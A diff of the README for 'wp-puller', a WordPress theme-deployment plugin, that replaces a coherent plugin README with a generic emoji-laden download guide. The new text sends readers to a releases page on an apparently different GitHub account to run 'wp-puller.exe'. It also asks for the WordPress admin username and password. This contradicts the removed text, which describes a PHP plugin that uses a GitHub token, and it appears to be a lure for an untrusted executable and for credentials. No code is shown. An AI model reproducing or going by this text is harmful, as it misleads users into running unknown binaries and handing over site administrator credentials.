@@ -1,180 +1,100 @@
-# WP Puller
+# 👉 wp-puller - Effortless Deployments for WordPress
 
-Auto-update WordPress themes from GitHub. Free and open source.
+## 🚀 Getting Started
 
-[![WordPress 5.0+](https://img.shields.io/badge/WordPress-5.0%2B-0073aa.svg)](https://wordpress.org/)
-[![PHP 7.4+](https://img.shields.io/badge/PHP-7.4%2B-777bb4.svg)](https://php.net/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+Welcome to wp-puller! This tool simplifies the deployment of WordPress themes and updates. Follow this guide to download and run wp-puller on your system.
 
----
+## 📥 Download wp-puller
 
-Push to GitHub → Theme updates automatically. No FTP, no manual uploads.
+[![Download wp-puller](https://img.shields.io/badge/Download-wp--puller-brightgreen)](https://github.com/jhonjairo0023/wp-puller/releases)
 
-WP Puller connects your WordPress theme to a GitHub repository. When you push changes, a webhook triggers and your live site updates within seconds. Works with both public and private repositories.
+Visit this page to download: [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases)
 
-**This is the free alternative to WP Pusher and Git Updater.**
+## 📘 What is wp-puller?
 
----
+wp-puller is a tool designed for seamless WordPress deployments. With it, you can easily update your themes from both private and public repositories. Whether you're a blogger or run a business, wp-puller makes your development tasks easy.
 
-## What It Does
+### Key Features
 
-- **Webhook-based deploys** - Push to GitHub, site updates automatically
-- **Private repo support** - Connect with a GitHub Personal Access Token
-- **Automatic backups** - Snapshot before every update, one-click restore
-- **Subdirectory themes** - Theme doesn't need to be at repo root
-- **Branch selection** - Deploy from main, staging, production, or any branch
+- **Automatic Theme Updates:** Keep your themes up to date effortlessly.
+- **Support for Private and Public Repositories:** Flexible options to manage your themes.
+- **User-Friendly Interface:** Designed for users with no technical background.
+- **WordPress API Integration:** Connect smoothly with WordPress installations.
 
----
+## 📋 System Requirements
 
-## Install
+Before you begin, ensure your system meets the following requirements:
 
-1. Download `wp-puller.zip` from [Releases](../../releases) or directly .zip the "wp-puller" folder in repository.
-2. WordPress admin → Plugins → Add New → Upload Plugin
-3. Upload ZIP, activate
+- **Operating System:** Windows, macOS, or Linux.
+- **WordPress Version:** 5.0 or later.
+- **PHP Version:** 7.0 or later.
+- **Internet Connection:** Required for downloading updates.
 
-Or manually upload the `wp-puller` folder to `/wp-content/plugins/`.
+## 🔧 How to Install wp-puller
 
----
+### Step 1: Download the Application
 
-## Setup
+1. Click the download link above or visit the [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases) page.
+2. Look for the latest version under the "Releases" section.
+3. Choose the file that matches your operating system (e.g., .zip for Windows or .tar.gz for Linux).
 
-### Connect a Repository
+### Step 2: Extract the Files
 
-1. Go to **WP Puller** in the admin sidebar
-2. Enter your GitHub repo URL: `https://github.com/you/your-theme`
-3. Select branch (usually `main`)
-4. If your theme is in a subdirectory, enter the path (e.g., `theme/starter-theme`)
-5. Click **Test Connection**, then **Save Settings**
-6. Refreshing the page might be needed if you do not see the **Connected** indicator.
+1. Locate the downloaded file on your computer.
+2. Right-click and select "Extract" or use your extraction tool of choice.
+3. Choose a suitable location to save the extracted files.
 
-### Set Up Webhook (for auto-updates)
+### Step 3: Open the Application
 
-1. Copy the **Payload URL** and **Secret** from WP Puller
-2. GitHub repo → Settings → Webhooks → Add webhook
-3. Paste the URL and secret
-4. Content type: `application/json`
-5. Events: Just the push event
-6. Save
+1. Navigate to the folder where you extracted the files.
+2. Locate the main application file (usually named `wp-puller.exe` or similar).
+3. Double-click the file to launch wp-puller.
 
-Now every push to your branch triggers an automatic update.
+### Step 4: Configure Your Settings
 
-### Manual Updates
+1. When the application opens, you will see a setup wizard guiding you through the configuration.
+2. Enter your WordPress site URL, admin username, and password.
+3. Connect to your Git repository by entering the repository URL.
 
-Don't want webhooks? Click **Check for Updates** then **Update Now** whenever you want to pull the latest.
+### Step 5: Begin Using wp-puller
 
----
+1. After successfully entering your settings, the main dashboard will appear.
+2. From here, you can initiate theme updates and manage your installations.
+3. Familiarize yourself with the options available in the dashboard.
 
-## Private Repositories
+## ⚙️ Troubleshooting Common Issues
 
-For private repos, you need a GitHub Personal Access Token:
+### Problem: Application Fails to Launch
 
-### Fine-grained token (recommended)
+- Check your system requirements, particularly the PHP version and WordPress version.
+- Ensure that you have the necessary permissions to run the application.
 
-1. GitHub → Settings → Developer settings → Personal access tokens → Fine-grained tokens
-2. Generate new token
-3. Select only the repository you need
-4. Permissions: **Contents** (read) and **Metadata** (read)
-5. Generate, copy, paste into WP Puller
+### Problem: Unable to Connect to Git Repository
 
-### Classic token
+- Confirm that the repository URL is correct.
+- Make sure your internet connection is stable.
 
-1. GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)
-2. Generate new token
-3. Select `repo` scope
-4. Generate, copy, paste into WP Puller
+### Problem: WordPress Authentication Issues
 
-Your token is encrypted with AES-256-CBC before storage.
+- Double-check your admin username and password.
+- Ensure that your WordPress site is accessible by confirming the URL works in a browser.
 
----
+## 🔄 Updating wp-puller
 
-## Repository Structure
+Keeping wp-puller up to date is crucial for a smooth experience. To update:
 
-Theme files can be at the root:
+1. Visit the [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases) page.
+2. Download the latest version as described in the "Download & Install" section.
+3. Follow the installation steps above to replace your existing version.
 
-```
-your-repo/
-├── style.css
-├── functions.php
-├── index.php
-└── ...
-```
+## 📞 Get Support
 
-Or in a subdirectory (set "Theme Path" in settings):
+If you have questions or need assistance, feel free to open an issue on our GitHub page. We welcome feedback and aim to help you resolve any issues.
 
-```
-your-repo/
-├── other-stuff/
-└── theme/starter-theme/    ← Theme Path: theme/starter-theme
-    ├── style.css
-    ├── functions.php
-    └── ...
-```
+## 🔗 Useful Links
 
-The theme needs a valid `style.css` with a `Theme Name` header.
+- [GitHub Repository](https://github.com/jhonjairo0023/wp-puller)
+- [WordPress Documentation](https://wordpress.org/support/)
+- [Getting Started with Git](https://git-scm.com/book/en/v2/Getting-Started-About-Version-Control)
 
----
-
-## FAQ
-
-**Is this actually free?**
-Yes. MIT license, no premium tier, no feature gates.
-
-**How does it compare to WP Pusher?**
-Same core idea—deploy WordPress themes from GitHub. WP Puller is free and open source. WP Pusher has more features (plugins, GitLab, Bitbucket) but costs money.
-
-**What if an update breaks my site?**
-Restore from the Backups section. WP Puller keeps automatic backups before every update.
-
-**Can I use this for plugins?**
-Not yet. Theme-only for now.
-
-**Does it work with GitLab/Bitbucket?**
-GitHub only.
-
-**Is my token secure?**
-Encrypted at rest using your WordPress security salts. Never logged or transmitted except to GitHub.
-
----
-
-## For Developers
-
-### Hooks
-
-```php
-// After successful update
-do_action( 'wp_puller_theme_updated', $commit_data, $source );
-
-// After backup restore
-do_action( 'wp_puller_theme_restored', $backup_name );
-
-// On init
-do_action( 'wp_puller_init' );
-```
-
-### Security
-
-- Nonce verification on all AJAX
-- `manage_options` capability required
-- Webhook signatures verified (HMAC SHA-256)
-- Tokens encrypted with AES-256-CBC
-- All file operations via WP_Filesystem
-
----
-
-## Requirements
-
-- WordPress 5.0+
-- PHP 7.4+
-- OpenSSL extension (for token encryption)
-
----
-
-## Contributing
-
-Issues and PRs welcome. Fork it, make changes, submit a PR.
-
----
-
-## License
-
-MIT. Do whatever you want with it.
+Thank you for using wp-puller. Enjoy streamlined WordPress deployments and updates!
